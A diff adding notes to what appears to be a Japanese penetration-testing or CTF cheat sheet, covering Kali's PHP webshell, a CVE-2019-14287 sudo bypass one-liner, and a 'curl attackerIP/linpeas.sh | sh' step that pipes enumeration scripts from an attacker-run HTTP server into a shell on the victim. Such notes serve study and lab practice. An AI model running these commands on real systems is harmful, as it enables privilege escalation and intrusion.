@@ -35,3 +35,29 @@
 #### webshell   
 ```/usr/share/webshells/php/simple-backdoor.php```
 > Kaliにはwebshellも用意されている  
+
+<br>  
+
+#### 権限昇格関連  
+
+```ps aux```  
+> 実行中のプロセスを表示  
+
+```sudo -u#-1 whoami```  
+> CVE-2019-14287  
+
+```attacker:~/enum$ sudo python -m SimpleHTTPServer 80```  
+```victim$ curl attackerIP/linpeas.sh | sh```  
+> attacker:~/enumフォルダには  
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
+https://github.com/diego-treitos/linux-smart-enumeration  
+https://github.com/rebootuser/LinEnum  
+などのEnumツールが入ってると仮定  
+上の例ではlinpeas.shを指定している
+
+
+
+<br>  
+
+#### スタック時のアドバイス  
+・キーワードになりそうなもの(些細なものでも)を一旦メモか何かにまとめる．  
